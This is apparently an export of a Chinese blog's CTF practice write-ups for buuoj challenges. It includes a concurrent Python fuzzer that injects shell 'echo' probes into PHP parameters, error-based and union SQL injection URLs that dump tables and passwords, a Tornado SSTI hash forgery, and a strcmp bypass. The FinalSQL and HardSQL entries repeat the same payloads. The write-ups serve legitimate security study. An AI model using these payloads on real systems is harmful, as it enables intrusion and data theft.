class="comment"># print(res_obj.group()[7:-2])</span></span><br><span class="line">                <span class="comment"># print(line)</span></span><br><span class="line">                get_set.add(res_obj.group()[<span class="number">7</span>:<span class="number">-2</span>])</span><br><span class="line"></span><br><span class="line">            res_obj = re.search(<span class="string">r"\$_POST\[.*\]"</span>, line)</span><br><span class="line">            <span class="keyword">if</span> res_obj:</span><br><span class="line">                <span class="comment"># print(res_obj.group()[8:-2])</span></span><br><span class="line">                <span class="comment"># print(line)</span></span><br><span class="line">                post_set.add(res_obj.group()[<span class="number">8</span>:<span class="number">-2</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># print("&#123;0&#125; get par total time = &#123;1&#125;".format(file_name, time.time()-begin_time))</span></span><br><span class="line">    <span class="keyword">return</span> get_set, post_set</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(file_name)</span>:</span></span><br><span class="line">    <span class="comment"># print("1111")</span></span><br><span class="line">    get_set, post_set = get_par(file_name)</span><br><span class="line">    get_request = list()</span><br><span class="line">    begin_time = time.time()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> get_set:</span><br><span class="line">        temp_url = pre_url + file_name</span><br><span class="line">        kw = &#123;i:<span class="string">'echo "4396haoxinshimin"'</span>&#125;</span><br><span class="line">        get_request.append(grequests.get(temp_url, params = kw))</span><br><span class="line">        <span class="comment"># response = requests.get(temp_url, params = kw)</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># print(kw)</span></span><br><span class="line">            <span class="comment"># print("123")</span></span><br><span class="line">    get_res_list = grequests.map(get_request)</span><br><span class="line">    <span class="keyword">for</span> res <span class="keyword">in</span> get_res_list:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"4396haoxinshimin"</span> <span class="keyword">in</span> res.content:</span><br><span class="line">            print(<span class="string">"ok"</span>)</span><br><span class="line">            print(<span class="string">"url = &#123;0&#125; params = &#123;1&#125;"</span>.format(temp_url, kw))</span><br><span class="line">            g_res.append(<span class="string">"url = &#123;0&#125; params = &#123;1&#125;"</span>.format(temp_url, kw))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    print(<span class="string">"&#123;0&#125; exp get total time = &#123;1&#125;"</span>.format(file_name, time.time()-begin_time))</span><br><span class="line">    post_request = list()</span><br><span class="line">    begin_time = time.time()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> post_set:</span><br><span class="line">        temp_url = pre_url + file_name</span><br><span class="line">        kw = &#123;i:<span class="string">'echo "4396haoxinshimin"'</span>&#125;</span><br><span class="line">        post_request.append(grequests.post(temp_url, data = kw))</span><br><span class="line"></span><br><span class="line">    post_res_list = grequests.map(post_request) </span><br><span class="line">    <span class="keyword">for</span> res <span class="keyword">in</span> post_res_list:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"4396haoxinshimin"</span> <span class="keyword">in</span> res.content:</span><br><span class="line">            print(<span class="string">"ok 111"</span>)</span><br><span class="line">            print(<span class="string">"url = &#123;0&#125; data = &#123;1&#125;"</span>.format(temp_url, kw))</span><br><span class="line">            g_res.append(<span class="string">"url = &#123;0&#125; params = &#123;1&#125;"</span>.format(temp_url, kw))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    print(<span class="string">"&#123;0&#125; exp post total time = &#123;1&#125;"</span>.format(file_name, time.time()-begin_time))</span><br><span class="line">    <span class="comment"># print("&#123;0&#125; end exp".format(file_name))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    start_time = time.time()</span><br><span class="line">    <span class="comment"># exp('xk0SzyKwfzw.php')</span></span><br><span class="line">    <span class="comment"># exp('XJGJA7EIFb5.php')</span></span><br><span class="line">    <span class="comment"># exp('xkDOw47BVCk.php')</span></span><br><span class="line">    <span class="comment"># print(file_list)</span></span><br><span class="line">    <span class="comment"># </span></span><br><span class="line">    pool = Pool(processes = <span class="number">16</span>)</span><br><span class="line">    <span class="comment"># print(file_list[5])</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(file_list)):</span><br><span class="line">        <span class="comment"># print(i)</span></span><br><span class="line">        pool.apply_async(exp,args=[file_list[i]])</span><br><span class="line">        <span class="comment"># print(file_list[i])</span></span><br><span class="line">        </span><br><span class="line">    pool.close()</span><br><span class="line">    pool.join()</span><br><span class="line">    print(g_res)</span><br><span class="line">    print(<span class="string">"total time = &#123;0&#125;"</span>.format(time.time()-start_time))</span><br><span class="line">    <span class="comment"># s = set()</span></span><br><span class="line">    <span class="comment"># s.add(1)</span></span><br><span class="line">    <span class="comment"># s.add(1)</span></span><br><span class="line">    <span class="comment"># s.add(2)</span></span><br><span class="line">    <span class="comment"># print(s)</span></span><br></pre></td></tr></table></figure>

<p><img data-src="./%E5%BC%BA%E7%BD%91%E6%9D%AF2019%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/3.png" alt></p>
<ul>
<li>最终跑出来的结果</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ok</span><br><span class="line">url = http://127.0.0.1/gm/xk0SzyKwfzw.php params = &#123;'Efa5BVG': 'echo "4396haoxinshimin"'&#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="./%E5%BC%BA%E7%BD%91%E6%9D%AF2019%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/4.png" alt></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>fuzz测试</tag>
        <tag>python并发</tag>
      </tags>
  </entry>
  <entry>
    <title>护网杯2018easy_tornado</title>
    <url>/2021/02/02/blog_formal/security/CTF/%E6%8A%A4%E7%BD%91%E6%9D%AF2018easy_tornado/</url>
    <content><![CDATA[<h1 id="护网杯2018easy-tornado"><a href="#护网杯2018easy-tornado" class="headerlink" title="护网杯2018easy_tornado"></a>护网杯2018easy_tornado</h1><p>​    菜鸡的日常练习</p>
<a id="more"></a>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    主要利用的知识点</p>
<ul>
<li><code>tornado</code></li>
<li><code>ssti</code></li>
</ul>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ul>
<li>登录首页</li>
</ul>
<p><img data-src="./%E6%8A%A4%E7%BD%91%E6%9D%AF2018easy_tornado/1.png" alt></p>
<p><img data-src="./%E6%8A%A4%E7%BD%91%E6%9D%AF2018easy_tornado/2.png" alt></p>
<p><img data-src="./%E6%8A%A4%E7%BD%91%E6%9D%AF2018easy_tornado/3.png" alt></p>
<p><img data-src="./%E6%8A%A4%E7%BD%91%E6%9D%AF2018easy_tornado/4.png" alt></p>
<ul>
<li>发现存在<code>ssti</code>注入</li>
</ul>
<p><img data-src="./%E6%8A%A4%E7%BD%91%E6%9D%AF2018easy_tornado/5.png" alt></p>
<ul>
<li>发现<code>cookie_secret</code></li>
</ul>
<p><img data-src="./%E6%8A%A4%E7%BD%91%E6%9D%AF2018easy_tornado/6.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">4899832a-6ede-4f81-8fbc-c619b70b7ae5</span><br></pre></td></tr></table></figure>

<ul>
<li>构造<code>payload</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;74e49c05-508a-4dc2-94b4-86eeeb217d99.node3.buuoj.cn&#x2F;file?filename&#x3D;&#x2F;fllllllllllllag&amp;filehash&#x3D;f1eac26b15f11dec95dfcb0b2a8f026e</span><br><span class="line"></span><br><span class="line">md5(&#x2F;fllllllllllllag) &#x3D; 3bf9f6cf685a6dd8defadabfb41a03a1</span><br><span class="line">md5(cookie_secret+md5(filename)) &#x3D; md5(4899832a-6ede-4f81-8fbc-c619b70b7ae5 + 3bf9f6cf685a6dd8defadabfb41a03a1) &#x3D; md5(4899832a-6ede-4f81-8fbc-c619b70b7ae53bf9f6cf685a6dd8defadabfb41a03a1) &#x3D; f1eac26b15f11dec95dfcb0b2a8f026e</span><br></pre></td></tr></table></figure>

<ul>
<li>拿到<code>flag</code></li>
</ul>
<p><img data-src="./%E6%8A%A4%E7%BD%91%E6%9D%AF2018easy_tornado/7.png" alt></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>buuoj</category>
      </categories>
      <tags>
        <tag>ssti</tag>
        <tag>tornado</tag>
      </tags>
  </entry>
  <entry>
    <title>极客大挑战2019BuyFlag</title>
    <url>/2021/01/22/blog_formal/security/CTF/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019BuyFlag/</url>
    <content><![CDATA[<h1 id="极客大挑战2019BuyFlag"><a href="#极客大挑战2019BuyFlag" class="headerlink" title="极客大挑战2019BuyFlag"></a>极客大挑战2019BuyFlag</h1><p>​    菜鸡的日常练习</p>
<a id="more"></a>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    主要利用的知识点</p>
<ul>
<li><code>strcmp</code>绕过</li>
</ul>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ul>
<li>登录首页</li>
</ul>
<p><img data-src="./%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019BuyFlag/1.png" alt></p>
<p><img data-src="./%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019BuyFlag/2.png" alt></p>
<ul>
<li>右键，查看网页源代码</li>
</ul>
<p><img data-src="./%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019BuyFlag/3.png" alt></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">	~~~post money <span class="keyword">and</span> password~~~</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">	$password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">	<span class="keyword">if</span> (is_numeric($password)) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"password can't be number&lt;/br&gt;"</span>;</span><br><span class="line">	&#125;<span class="keyword">elseif</span> ($password == <span class="number">404</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"Password Right!&lt;/br&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>需要将 <code>cookie use = 1</code> 传递<code>password=404%20</code></li>
</ul>
<p><img data-src="./%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019BuyFlag/4.png" alt></p>
<ul>
<li>尝试传递<code>money</code></li>
</ul>
<p><img data-src="./%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019BuyFlag/5.png" alt></p>
<ul>
<li>发现不能传递过长字符串，猜测后台用<code>strcmp</code>比较，传递数组</li>
</ul>
<p><img data-src="./%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019BuyFlag/6.png" alt></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>strcmp绕过</tag>
      </tags>
  </entry>
  <entry>
    <title>极客大挑战2019FinalSQL</title>
    <url>/2021/02/05/blog_formal/security/CTF/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019FinalSQL/</url>
    <content><![CDATA[<h1 id="极客大挑战2019FinalSQL"><a href="#极客大挑战2019FinalSQL" class="headerlink" title="极客大挑战2019FinalSQL"></a>极客大挑战2019FinalSQL</h1><p>​    菜鸡的日常练习</p>
<a id="more"></a>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    主要利用的知识点</p>
<ul>
<li><code>sql</code>注入</li>
<li>报错注入</li>
</ul>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ul>
<li>登录首页</li>
</ul>
<p><img data-src="./%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019FinalSQL/1.png" alt></p>
<ul>
<li>发现异或注入</li>
</ul>
<p><img data-src="./%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019FinalSQL/2.png" alt></p>
<p><img data-src="./%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019FinalSQL/3.png" alt></p>
<ul>
<li><code>sql fuzz</code>一波</li>
</ul>
<ul>
<li>注入</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://dae09fa9-cbf8-459d-bff9-4f3e58d18197.node3.buuoj.cn/check.php?username=admin%27or(updatexml(1,concat(0x7e,database(),0x7e),1))%23&amp;password=admin</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">geek</span><br><span class="line"></span><br><span class="line">http://dae09fa9-cbf8-459d-bff9-4f3e58d18197.node3.buuoj.cn/check.php?username=admin%27or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))%23&amp;password=admin</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">H4rDsq1</span><br><span class="line"></span><br><span class="line">http://dae09fa9-cbf8-459d-bff9-4f3e58d18197.node3.buuoj.cn/check.php?username=admin%27or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')),0x7e),1))%23&amp;password=admin</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">id</span><br><span class="line">username</span><br><span class="line">password</span><br><span class="line"></span><br><span class="line">http://dae09fa9-cbf8-459d-bff9-4f3e58d18197.node3.buuoj.cn/check.php?username=admin%27or(updatexml(1,concat(0x7e,(select(group_concat(password))from(geek.H4rDsq1)),0x7e),1))%23&amp;password=admin</span><br></pre></td></tr></table></figure>

<ul>
<li>只出现了部分<code>flag</code> <code>flag{a34202ba-f3af-47ba-ae52-e4</code></li>
</ul>
<p><img data-src="./%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019FinalSQL/4.png" alt></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;dae09fa9-cbf8-459d-bff9-4f3e58d18197.node3.buuoj.cn&#x2F;check.php?username&#x3D;admin%27or(updatexml(1,right(concat(0x7e,(select(group_concat(password))from(geek.H4rDsq1)),0x7e),10),1))%23&amp;password&#x3D;admin</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">ccd14e&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>爆破<code>right</code>的<code>length</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&#123;a34202ba-f3af-47ba-ae52-e45296c</span><br></pre></td></tr></table></figure>

<p><img data-src="./%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019FinalSQL/5.png" alt></p>
<p>已有</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">flag&#123;a34202ba-f3af-47ba-ae52-e4</span><br><span class="line">&#123;a34202ba-f3af-47ba-ae52-e45296c</span><br><span class="line">ccd14e&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">flag&#123;a34202ba-f3af-47ba-ae52-e45296ccd14e&#125;  ok</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
        <category>buuoj</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
        <tag>报错注入</tag>
      </tags>
  </entry>
  <entry>
    <title>极客大挑战2019HardSQL</title>
    <url>/2021/02/05/blog_formal/security/CTF/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019HardSQL/</url>
    <content><![CDATA[<h1 id="极客大挑战2019HardSQL"><a href="#极客大挑战2019HardSQL" class="headerlink" title="极客大挑战2019HardSQL"></a>极客大挑战2019HardSQL</h1><p>​    菜鸡的日常练习</p>
<a id="more"></a>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    主要利用的知识点</p>
<ul>
<li><code>sql</code>注入</li>
<li>报错注入</li>
</ul>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ul>
<li>登录首页</li>
</ul>
<p><img data-src="./%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019HardSQL/1.png" alt></p>
<ul>
<li>发现报错注入</li>
</ul>
<p><img data-src="./%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019HardSQL/2.png" alt></p>
<ul>
<li><code>sql fuzz</code>一波</li>
</ul>
<p><img data-src="./%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019HardSQL/3.png" alt></p>
<ul>
<li>注入</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://dae09fa9-cbf8-459d-bff9-4f3e58d18197.node3.buuoj.cn/check.php?username=admin%27or(updatexml(1,concat(0x7e,database(),0x7e),1))%23&amp;password=admin</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">geek</span><br><span class="line"></span><br><span class="line">http://dae09fa9-cbf8-459d-bff9-4f3e58d18197.node3.buuoj.cn/check.php?username=admin%27or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))%23&amp;password=admin</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">H4rDsq1</span><br><span class="line"></span><br><span class="line">http://dae09fa9-cbf8-459d-bff9-4f3e58d18197.node3.buuoj.cn/check.php?username=admin%27or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')),0x7e),1))%23&amp;password=admin</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">id</span><br><span class="line">username</span><br><span class="line">password</span><br><span class="line"></span><br><span class="line">http://dae09fa9-cbf8-459d-bff9-4f3e58d18197.node3.buuoj.cn/check.php?username=admin%27or(updatexml(1,concat(0x7e,(select(group_concat(password))from(geek.H4rDsq1)),0x7e),1))%23&amp;password=admin</span><br></pre></td></tr></table></figure>

<ul>
<li>只出现了部分<code>flag</code> <code>flag{a34202ba-f3af-47ba-ae52-e4</code></li>
</ul>
<p><img data-src="./%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019HardSQL/4.png" alt></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;dae09fa9-cbf8-459d-bff9-4f3e58d18197.node3.buuoj.cn&#x2F;check.php?username&#x3D;admin%27or(updatexml(1,right(concat(0x7e,(select(group_concat(password))from(geek.H4rDsq1)),0x7e),10),1))%23&amp;password&#x3D;admin</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">ccd14e&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>爆破<code>right</code>的<code>length</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&#123;a34202ba-f3af-47ba-ae52-e45296c</span><br></pre></td></tr></table></figure>

<p><img data-src="./%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019HardSQL/5.png" alt></p>
<p>已有</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">flag&#123;a34202ba-f3af-47ba-ae52-e4</span><br><span class="line">&#123;a34202ba-f3af-47ba-ae52-e45296c</span><br><span class="line">ccd14e&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">flag&#123;a34202ba-f3af-47ba-ae52-e45296ccd14e&#125;  ok</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
        <category>buuoj</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
        <tag>报错注入</tag>
      </tags>
  </entry>
  <entry>
    <title>极客大挑战2019Havefun</title>
    <url>/2021/01/27/blog_formal/security/CTF/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Havefun/</url>
    <content><![CDATA[<h2 id="极客大挑战2019Havefun"><a href="#极客大挑战2019Havefun" class="headerlink" title="极客大挑战2019Havefun"></a>极客大挑战2019Havefun</h2><p>​    菜鸡的日常练习</p>
<a id="more"></a>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    主要利用的知识点</p>
<ul>
<li>网页源代码</li>
</ul>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ul>
<li>登录首页</li>
</ul>
<p><img data-src="./%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Havefun/1.png" alt></p>
<ul>
<li>右键查看源代码</li>
</ul>
<p><img data-src="./%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Havefun/2.png" alt></p>
<p><img data-src="./%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Havefun/3.png" alt></p>
<p>签到…</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>buuoj</category>
      </categories>
      <tags>
        <tag>网页源代码</tag>
      </tags>
  </entry>
  <entry>
    <title>极客大挑战2019Http</title>
    <url>/2021/03/16/blog_formal/security/CTF/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Http/</url>
    <content><![CDATA[<h1 id="极客大挑战2019Http"><a href="#极客大挑战2019Http" class="headerlink" title="极客大挑战2019Http"></a>极客大挑战2019Http</h1><p>​    菜鸡的日常练习</p>
<a id="more"></a>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    主要利用的知识点</p>
<ul>
<li><code>http</code>协议</li>
</ul>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ul>
<li>登录首页</li>
</ul>
<p><img data-src="./%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Http/1.png" alt></p>
<ul>
<li>访问<code>Secret.php</code></li>
</ul>
<p><img data-src="./%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Http/2.png" alt></p>
<p><img data-src="./%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Http/3.png" alt></p>
<ul>
<li>根据提示逐步增加如下字段</li>
</ul>
<p><img data-src="./%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Http/4.png" alt></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>buuoj</category>
      </categories>
      <tags>
        <tag>http协议</tag>
      </tags>
  </entry>
  <entry>
    <title>极客大挑战2019Knife</title>
    <url>/2021/02/02/blog_formal/security/CTF/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Knife/</url>
    <content><![CDATA[<h1 id="极客大挑战2019Knife"><a href="#极客大挑战2019Knife" class="headerlink" title="极客大挑战2019Knife"></a>极客大挑战2019Knife</h1><p>​    菜鸡的日常练习</p>
<a id="more"></a>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    主要利用的知识点</p>
<ul>
<li>一句话木马</li>
</ul>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ul>
<li>登录首页</li>
</ul>
<p><img data-src="./%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Knife/1.png" alt></p>
<ul>
<li>直接连接后台</li>
</ul>
<p><img data-src="./%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Knife/2.png" alt></p>
<p>easy…</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>buuoj</category>
      </categories>
      <tags>
        <tag>一句话木马</tag>
      </tags>
  </entry>
  <entry>
    <title>极客大挑战2019LoveSQL</title>
    <url>/2021/01/27/blog_formal/security/CTF/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019LoveSQL/</url>
    <content><![CDATA[<h1 id="极客大挑战2019LoveSQL"><a href="#极客大挑战2019LoveSQL" class="headerlink" title="极客大挑战2019LoveSQL"></a>极客大挑战2019LoveSQL</h1><p>​    菜鸡的日常练习</p>
<a id="more"></a>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    主要利用的知识点</p>
<ul>
<li><code>sql</code>注入</li>
</ul>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ul>
<li>登录首页</li>
</ul>
<p><img data-src="./%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019LoveSQL/1.png" alt></p>
<ul>
<li>发现密码字段存在注入点</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://12af2fd1-6056-4baf-bcb2-48c1d2120db1.node3.buuoj.cn/check.php?username=admin&amp;password=admin' union select 1,2,3 -- qwe</span><br></pre></td></tr></table></figure>

<p><img data-src="./%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019LoveSQL/2.png" alt></p>
<ul>
<li><code>fuzz</code>一波参数</li>
</ul>
<p><img data-src="./%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019LoveSQL/3.png" alt></p>
<p>没有过滤</p>
<ul>
<li>正常手注流程</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 字段数 3</span></span><br><span class="line">http://12af2fd1-6056-4baf-bcb2-48c1d2120db1.node3.buuoj.cn/check.php?username=admin&amp;password=admin' order by 3 -- qwe</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 回显点 2 3</span></span><br><span class="line">http://12af2fd1-6056-4baf-bcb2-48c1d2120db1.node3.buuoj.cn/check.php?username=admin&amp;password=admin' union select 1,2,3 -- qwe</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 数据库 geek</span></span><br><span class="line">http://12af2fd1-6056-4baf-bcb2-48c1d2120db1.node3.buuoj.cn/check.php?username=admin&amp;password=admin' union select 1,2,database() -- qwe</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 表名  geekuser l0ve1ysq1</span></span><br><span class="line">http://12af2fd1-6056-4baf-bcb2-48c1d2120db1.node3.buuoj.cn/check.php?username=admin&amp;password=admin' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='geek' -- qwe</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 列名 id, username, password</span></span><br><span class="line">http://12af2fd1-6056-4baf-bcb2-48c1d2120db1.node3.buuoj.cn/check.php?username=admin&amp;password=admin' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='l0ve1ysq1' -- qwe</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 字段</span></span><br><span class="line">http://12af2fd1-6056-4baf-bcb2-48c1d2120db1.node3.buuoj.cn/check.php?username=admin&amp;password=admin' union select 1, group_concat(username), group_concat(password) from l0ve1ysq1 -- qwe</span><br></pre></td></tr></table></figure>

<p><img data-src="./%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019LoveSQL/4.png" alt></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>buuoj</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>极客大挑战2019PHP</title>
    <url>/2021/03/15/blog_formal/security/CTF/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019PHP/</url>
    <content><![CDATA[<h1 id="极客大挑战2019PHP"><a href="#极客大挑战2019PHP" class="headerlink" title="极客大挑战2019PHP"></a>极客大挑战2019PHP</h1><p>​    菜鸡的日常练习</p>
<a id="more"></a>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    主要利用的知识点</p>
<ul>
<li>源码泄露</li>
<li><code>php</code>反序列化</li>
</ul>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ul>
<li>登录首页</li>
</ul>
<p><img data-src="./%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019PHP/1.png" alt></p>
<ul>
<li>提示网站备份，下载<code>www.zip</code></li>
</ul>
<p><img data-src="./%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019PHP/2.png" alt></p>
<ul>
<li>发现反序列化</li>
</ul>
<p><img data-src="./%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019PHP/3.png" alt></p>
